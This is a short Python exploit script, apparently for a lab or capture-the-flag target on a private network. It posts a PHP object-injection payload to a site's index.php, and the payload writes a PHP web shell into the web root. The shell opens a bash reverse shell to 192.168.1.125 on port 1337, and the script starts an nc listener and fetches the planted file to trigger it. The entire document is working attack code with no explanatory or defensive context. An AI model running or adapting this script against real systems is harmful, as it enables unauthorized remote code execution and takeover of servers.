import urllib3
import requests
import subprocess

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

session = requests.Session()

url = 'http://192.168.1.144'

postURL = url + '/index.php'

data = {'param':'O:3:"Log":2:{s:8:"filename";s:29:"/var/www/html/scriptz/rev.php";s:4:"data";s:73:"<?php system("bash -c \'bash -i >& /dev/tcp/192.168.1.125/1337 0>&1\'"); ?>";} '}
session.post(postURL, verify=False, proxies=proxies, data=data)

nc_listener = subprocess.Popen(["nc","-nvlp","1337"])

getURL = url  + '/scriptz/rev.php'
session.get(getURL, verify=False, proxies=proxies)

nc_listener.wait()